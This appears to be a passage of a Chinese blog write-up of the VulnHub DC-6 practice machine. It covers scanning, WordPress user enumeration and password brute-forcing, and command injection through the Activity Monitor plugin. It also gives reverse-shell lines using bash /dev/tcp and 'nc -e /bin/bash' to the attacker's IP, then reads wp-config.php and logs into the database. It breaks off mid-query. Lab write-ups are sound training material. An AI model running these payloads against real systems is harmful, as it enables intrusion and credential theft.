@@ -1,0 +1,563 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+  <title>DC：6 - Knight&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Knight's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/post.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="DC：6">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-07-11 00:00" pubdate>
+        2022年7月11日 凌晨
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      3k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      54
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">DC：6</h1>
+            
+            <div class="markdown-body">
+              <h1 id="0x09-DC-6-vulnhub"><a href="#0x09-DC-6-vulnhub" class="headerlink" title="0x09 DC: 6~vulnhub"></a>0x09 DC: 6~vulnhub</h1><blockquote>
+<p>靶机地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-6,315/">DC: 6 ~ VulnHub</a></p>
+<p>环境信息：</p>
+<ul>
+<li>攻击机 IP：192.168.135.141</li>
+<li>靶机 IP：192.168.135.161</li>
+</ul>
+</blockquote>
+<h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h3><p><strong>nmap 命令：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -sn 192.168.135.0/24</span><br></code></pre></td></tr></table></figure>
+<p><strong>得到靶机 ip：192.168.135.161</strong></p>
+<h3 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h3><p><strong>nmap 命令：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo nmap -sS -A -p- 192.168.135.161</span><br>[sudo] password for kali: <br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-07-11 10:35 EDT<br>Nmap scan report for 192.168.135.161<br>Host is up (0.00063s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd (RSA)<br>|   256 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f (ECDSA)<br>|_  256 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee (ED25519)<br>80/tcp open  http    Apache httpd 2.4.25 ((Debian))<br>|_http-server-header: Apache/2.4.25 (Debian)<br>|_http-title: Did not follow redirect to http://wordy/<br>MAC Address: 00:0C:29:A3:6E:B2 (VMware)<br>Device type: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br></code></pre></td></tr></table></figure>
+<p><strong>得到目标端口信息：</strong></p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>PORT</th>
+<th>STATE</th>
+<th>SERVICE</th>
+<th>VERSION</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>22/tcp</td>
+<td>open</td>
+<td>ssh</td>
+<td>OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</td>
+</tr>
+<tr>
+<td>80/tcp</td>
+<td>open</td>
+<td>http</td>
+<td>Apache httpd 2.4.25 ((Debian))</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3 id="3、端口探测"><a href="#3、端口探测" class="headerlink" title="3、端口探测"></a>3、端口探测</h3><p><strong>22端口</strong></p>
+<p>暂时未得到 username 和 password 的相关信息，无法使用 ssh</p>
+<p><strong>80端口</strong></p>
+<blockquote>
+<p>NOTE: You WILL need to edit your hosts file on your pentesting device so that it reads something like:</p>
+<p>192.168.0.142 wordy</p>
+<p>NOTE: I’ve used 192.168.0.142 as an example. You’ll need to use your normal method to determine the IP address of the VM, and adapt accordingly.</p>
+<p>This is VERY important.</p>
+</blockquote>
+<p>访问 <code>http://192.168.135.161</code> ，发现无法访问且重定向到了 <code>http://wordy/</code> ，这样的话我们添加一条映射：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cat /etc/hosts</span>          <br>127.0.0.1       localhost<br>127.0.1.1       kali<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> sudo mousepad /etc/hosts</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> cat /etc/hosts</span>          <br>127.0.0.1       localhost<br>127.0.1.1       kali<br>192.168.135.161 wordy<br><br></code></pre></td></tr></table></figure>
+<p>这样就可以正常访问了。</p>
+<p>进行目录爆破：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> dirb http://wordy</span>                                                    <br><br>---- Scanning URL: http://wordy/ ----<br>+ http://wordy/index.php (CODE:301|SIZE:0)<br>+ http://wordy/server-status (CODE:403|SIZE:293)<br>==&gt; DIRECTORY: http://wordy/wp-admin/<br>==&gt; DIRECTORY: http://wordy/wp-content/<br>==&gt; DIRECTORY: http://wordy/wp-includes/<br>+ http://wordy/xmlrpc.php (CODE:405|SIZE:42)<br></code></pre></td></tr></table></figure>
+<p>发现是个 WordPress 站点，使用 wpscan 枚举：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> wpscan --url http://wordy --enumerate u</span><br><br>[+] URL: http://wordy/ [192.168.135.161]<br><br>[+] WordPress version 5.1.1 identified (Insecure, released on 2019-03-13).<br> | Found By: Rss Generator (Passive Detection)<br> |  - http://wordy/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.1.1&lt;/generator&gt;<br> |  - http://wordy/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.1.1&lt;/generator&gt;<br><br>[+] Enumerating Users (via Passive and Aggressive Methods)<br> Brute Forcing Author IDs - Time: 00:00:00 &lt;=============================================================&gt; (10 / 10) 100.00% Time: 00:00:00<br><br>[i] User(s) Identified:<br><br>[+] admin<br> | Found By: Rss Generator (Passive Detection)<br> | Confirmed By:<br> |  Wp Json Api (Aggressive Detection)<br> |   - http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1<br> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> |  Login Error Messages (Aggressive Detection)<br><br>[+] jens<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)<br><br>[+] graham<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)<br><br>[+] mark<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)<br><br>[+] sarah<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)<br></code></pre></td></tr></table></figure>
+<p>题目作者给的提示：</p>
+<blockquote>
+<p>CLUE</p>
+<p>OK, this isn’t really a clue as such, but more of some “we don’t want to spend five years waiting for a certain process to finish” kind of advice for those who just want to get on with the job.</p>
+<p>cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt </p>
+<p>That should save you a few years. ;-)</p>
+</blockquote>
+<p>创建字典进行爆破：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;admin\njens\ngraham\nmark\nsarah&quot;</span> &gt; user.txt</span><br><span class="hljs-meta">$</span><span class="bash"> cat user.txt</span>  <br>admin<br>jens<br>graham<br>mark<br>sarah<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> wpscan --url http://wordy -U user.txt -P passwords.txt</span><br><br>[+] Performing password attack on Xmlrpc against 5 user/s<br>[SUCCESS] - mark / helpdesk01                                                                                                              <br>Trying sarah / !lak019b Time: 00:03:23 &lt;=================================================           &gt; (12547 / 15215) 82.46%  ETA: ??:??:??<br><br>[!] Valid Combinations Found:<br> | Username: mark, Password: helpdesk01<br></code></pre></td></tr></table></figure>
+<p>访问 <code>http://wordy/wp-admin</code> ，重定向到后台登录页 <code>http://wordy/wp-login.php</code> ，进行登录</p>
+<h2 id="二、权限获取"><a href="#二、权限获取" class="headerlink" title="二、权限获取"></a>二、权限获取</h2><p>在 <code>activity_monitor</code> ===&gt; <code>tools</code> 下，发现有个解析 IP 地址为主机名的查找功能，这个功能可以实现远程命令执行</p>
+<p>burp 抓包：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>wordy<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://wordy/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=---------------------------231067001935986298275393280<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>30<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://wordy<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>wordpress_14014489b649086e51cacb340bafe656=mark%7C1657762666%7CV5tY1Gig7Y3BLyLMi2N8APVpcQNksGkYUCeB7mpv33l%7C4eae77eb132fc3228c3b189f7fac3315ddfb2ed11d1c46392067d0553d01d545; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_14014489b649086e51cacb340bafe656=mark%7C1657762666%7CV5tY1Gig7Y3BLyLMi2N8APVpcQNksGkYUCeB7mpv33l%7C74082dfc18805151b1531c3cd705624ccf2179b8b53e32317faf53e3276321cc; wp-settings-time-3=1657589884; wp-settings-3=mfold%3Do<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br><span class="applescript"><span class="hljs-comment">-----------------------------231067001935986298275393280</span></span><br><span class="applescript">Content-Disposition: form-data; <span class="hljs-built_in">name</span>=<span class="hljs-string">&quot;ip&quot;</span></span><br><span class="applescript"></span><br><span class="applescript"><span class="hljs-number">192.168</span><span class="hljs-number">.135</span><span class="hljs-number">.141</span></span><br><span class="applescript"><span class="hljs-comment">-----------------------------231067001935986298275393280</span></span><br><span class="applescript">Content-Disposition: form-data; <span class="hljs-built_in">name</span>=<span class="hljs-string">&quot;lookup&quot;</span></span><br><span class="applescript"></span><br><span class="applescript">Lookup</span><br><span class="applescript"><span class="hljs-comment">-----------------------------231067001935986298275393280--</span></span><br></code></pre></td></tr></table></figure>
+<p>改包：</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">192.168.135.141</span>;whoami<br></code></pre></td></tr></table></figure>
+<p>放包，成功实现命令执行：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2022</span>-<span class="hljs-number">07</span>-<span class="hljs-number">12</span> <span class="hljs-number">01</span>:<span class="hljs-number">58</span>:<span class="hljs-number">02</span><br><br><span class="hljs-attribute">The</span> IP address <span class="hljs-number">192.168.135.141</span>;whoami resolves to .<br><br><span class="hljs-attribute">Output</span> from dig:<br><br><span class="hljs-attribute">www</span>-data<br></code></pre></td></tr></table></figure>
+<p>反弹 shell：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> bash, fail</span><br>192.168.135.141;bash -i &gt;&amp; /dev/tcp/192.168.135.141/4444 0&gt;&amp;1<br><span class="hljs-meta">#</span><span class="bash"> nc, success</span><br>192.168.135.141;nc -e /bin/bash 192.168.135.141 4444<br></code></pre></td></tr></table></figure>
+<p>kali 监听，成功得到 shell：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lnvp 4444</span>                                         <br>listening on [any] 4444 ...<br>connect to [192.168.135.141] from (UNKNOWN) [192.168.135.161] 48976<br>whoami<br>www-data<br>python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;<br>www-data@dc-6:/var/www/html/wp-admin$<br></code></pre></td></tr></table></figure>
+<p>也可以直接查找利用脚本：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> searchsploit wordpress activity monitor</span>                 <br>----------------------------------------------------------------------------------------------------------<br>Exploit Title                                                                                            |  Path<br>----------------------------------------------------------------------------------------------------------<br>WordPress Plugin Plainview Activity Monitor 20161228 - (Authenticated) Command Injection                 | php/webapps/45274.html<br>WordPress Plugin Plainview Activity Monitor 20161228 - Remote Code Execution (RCE) (Authenticated) (2)   | php/webapps/50110.py<br>----------------------------------------------------------------------------------------------------------<br>Shellcodes: No Results<br></code></pre></td></tr></table></figure>
+<h2 id="三、权限提升"><a href="#三、权限提升" class="headerlink" title="三、权限提升"></a>三、权限提升</h2><p>查找 SUID：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@dc-6:/var/www/html/wp-admin$ find / -perm -u=s -type f 2&gt;/dev/null<br>find / -perm -u=s -type f 2&gt;/dev/null<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/lib/openssh/ssh-keysign<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/bin/chfn<br>/usr/bin/sudo<br>/usr/bin/gpasswd<br>/usr/bin/newgrp<br>/usr/bin/chsh<br>/usr/bin/passwd<br>/bin/su<br>/bin/mount<br>/bin/umount<br>/bin/ping<br></code></pre></td></tr></table></figure>
+<p>查看配置文件，得到数据库账号密码：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@dc-6:/var/www/html/wp-admin$ cd ..<br>cd ..<br>www-data@dc-6:/var/www/html$ ls<br>ls<br>index.php        wp-blog-header.php    wp-cron.php        wp-mail.php<br>license.txt      wp-comments-post.php  wp-includes        wp-settings.php<br>readme.html      wp-config-sample.php  wp-links-opml.php  wp-signup.php<br>wp-activate.php  wp-config.php         wp-load.php        wp-trackback.php<br>wp-admin         wp-content            wp-login.php       xmlrpc.php<br>www-data@dc-6:/var/www/html$ cat wp-config.php<br>cat wp-config.php<br><br>// ** MySQL settings - You can get this info from your web host ** //<br>/** The name of the database for WordPress */<br><br>define(&#x27;WP_HOME&#x27;,&#x27;http://wordy&#x27;);<br>define(&#x27;WP_SITEURL&#x27;,&#x27;http://wordy&#x27;);<br><br>define( &#x27;DB_NAME&#x27;, &#x27;wordpressdb&#x27; );<br><br>/** MySQL database username */<br>define( &#x27;DB_USER&#x27;, &#x27;wpdbuser&#x27; );<br><br>/** MySQL database password */<br>define( &#x27;DB_PASSWORD&#x27;, &#x27;meErKatZ&#x27; );<br><br>/** MySQL hostname */<br>define( &#x27;DB_HOST&#x27;, &#x27;localhost&#x27; );<br><br>/** Database Charset to use in creating database tables. */<br>define( &#x27;DB_CHARSET&#x27;, &#x27;utf8&#x27; );<br><br>/** The Database Collate type. Don&#x27;t change this if in doubt. */<br>define( &#x27;DB_COLLATE&#x27;, &#x27;&#x27; );<br></code></pre></td></tr></table></figure>
+<p>登录数据库，得到用户密码盐值：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@dc-6:/var/www/html$ mysql -uwpdbuser -pmeErKatZ<br>mysql -uwpdbuser -pmeErKatZ<br>Welcome to the MariaDB monitor.  Commands end with ; or \g.<br>Your MariaDB connection id is 92559<br>Server version: 10.1.37-MariaDB-0+deb9u1 Debian 9.6<br><br>Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.<br><br>Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.<br><br>MariaDB [(none)]&gt; show databases;<br>show databases;<br>+--------------------+<br>| Database           |<br>+--------------------+<br>| information_schema |<br>| wordpressdb        |<br>+--------------------+<br>2 rows in set (0.05 sec)<br><br>MariaDB [(none)]&gt; use wordpressdb;<br>use wordpressdb;<br>Reading table information for completion of table and column names<br>You can turn off this feature to get a quicker startup with -A<br><br>Database changed<br>MariaDB [wordpressdb]&gt; show tables;<br>show tables;<br>+-----------------------+<br>| Tables_in_wordpressdb |<br>+-----------------------+<br>| wp_commentmeta        |<br>| wp_comments           |<br>| wp_links              |<br>| wp_options            |<br>| wp_postmeta           |<br>| wp_posts              |<br>| wp_pv_am_activities   |<br>| wp_term_relationships |<br>| wp_term_taxonomy      |<br>| wp_termmeta           |<br>| wp_terms              |<br>| wp_usermeta           |<br>| wp_users              |<br>+-----------------------+<br>13 rows in set (0.00 sec)<br><br>MariaDB [wordpressdb]&gt; select 